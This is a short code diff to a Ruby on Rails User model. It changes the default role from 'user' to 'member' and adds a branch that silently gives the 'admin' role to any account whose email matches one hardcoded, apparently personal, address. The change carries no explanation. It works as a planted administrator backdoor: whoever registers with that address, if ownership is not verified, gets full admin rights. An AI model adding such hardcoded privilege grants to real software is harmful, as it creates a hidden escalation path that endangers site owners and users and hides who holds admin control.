@@ -20,7 +20,11 @@ class User < ApplicationRecord
   private
 
   def set_default_role
-    self.role ||= "user"
+    if email&.downcase&.strip == "jhlim725@gmail.com"
+      self.role = "admin"
+    else
+      self.role ||= "member"
+    end
   end
 
   def downcase_email
